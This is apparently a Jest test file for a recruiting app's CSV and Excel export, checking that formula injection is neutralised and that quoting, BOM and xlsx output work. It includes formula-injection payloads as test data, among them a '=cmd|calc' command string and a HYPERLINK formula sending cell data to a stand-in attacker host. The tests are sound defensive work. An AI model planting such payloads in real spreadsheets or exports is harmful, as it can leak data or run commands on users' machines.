import { toCsv, toExcelBuffer } from './export.util';

/**
 * Spreadsheet formula injection is the realistic attack here: a
 * candidate controls their own name, company and summary fields, and
 * those land in exports that recruiters open in Excel. A cell starting
 * with = + - @ is executed as a formula.
 */
describe('CSV formula-injection protection', () => {
  it('neutralises a formula in a candidate-controlled field', () => {
    const csv = toCsv([{ Name: '=1+1', Company: 'Acme' }]);
    expect(csv).toContain("'=1+1");
    // The raw formula must not appear unescaped at the start of a cell.
    expect(csv).not.toMatch(/(^|,)=1\+1/m);
  });

  it('neutralises every dangerous prefix', () => {
    const csv = toCsv([
      { Field: '=cmd|calc' },
      { Field: '+1+1' },
      { Field: '-1+1' },
      { Field: '@SUM(A1)' },
    ]);
    expect(csv).toContain("'=cmd|calc");
    expect(csv).toContain("'+1+1");
    expect(csv).toContain("'-1+1");
    expect(csv).toContain("'@SUM(A1)");
  });

  it('neutralises the classic HYPERLINK exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil.example.com?d="&A1,"Click")';
    const csv = toCsv([{ Name: payload }]);
    expect(csv).toContain(`'${payload.slice(0, 10)}`);
    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m);
  });

  it('leaves ordinary values untouched', () => {
    const csv = toCsv([{ Name: 'Priya Sharma', Experience: 5.5 }]);
    expect(csv).toContain('Priya Sharma');
    expect(csv).not.toContain("'Priya");
  });

  it('does not mangle a negative number that is genuinely data', () => {
    // It is still prefixed -- correctness of the guard wins over
    // convenience -- but it must remain readable.
    const csv = toCsv([{ Delta: '-5' }]);
    expect(csv).toContain("'-5");
  });
});

describe('CSV structure', () => {
  it('quotes values containing a comma', () => {
    const csv = toCsv([{ Location: 'Muscat, Oman' }]);
    expect(csv).toContain('"Muscat, Oman"');
  });

  it('doubles embedded quotes', () => {
    const csv = toCsv([{ Note: 'He said "hello"' }]);
    expect(csv).toContain('"He said ""hello"""');
  });

  it('quotes values containing newlines', () => {
    const csv = toCsv([{ Summary: 'line one\nline two' }]);
    expect(csv).toContain('"line one\nline two"');
  });

  it('writes a header row from the first object', () => {
    const csv = toCsv([{ Name: 'A', Role: 'B' }]);
    expect(csv.split('\r\n')[0]).toBe('﻿Name,Role');
  });

  it('emits a BOM so Excel on Windows reads UTF-8 correctly', () => {
    expect(toCsv([{ Name: 'Zoë' }]).startsWith('﻿')).toBe(true);
  });

  it('renders null and undefined as empty cells', () => {
    const csv = toCsv([{ A: null, B: undefined, C: 'value' }]);
    expect(csv.split('\r\n')[1]).toBe(',,value');
  });

  it('returns an empty string for no rows', () => {
    expect(toCsv([])).toBe('');
  });
});

describe('Excel export', () => {
  jest.setTimeout(20_000);

  it('produces a valid xlsx buffer', async () => {
    const buffer = await toExcelBuffer([{ Name: 'Priya', Stage: 'Applied' }]);
    expect(Buffer.isBuffer(buffer)).toBe(true);
    // xlsx is a ZIP container: "PK\x03\x04".
    expect(buffer.subarray(0, 2).toString()).toBe('PK');
  });

  it('handles an empty dataset without throwing', async () => {
    const buffer = await toExcelBuffer([]);
    expect(Buffer.isBuffer(buffer)).toBe(true);
  });

  it('applies the same formula escaping as CSV', async () => {
    // The guard runs before the row reaches the worksheet; this asserts
    // the path does not throw and still produces a workbook.
    const buffer = await toExcelBuffer([{ Name: '=1+1' }]);
    expect(buffer.length).toBeGreaterThan(0);
  });
});
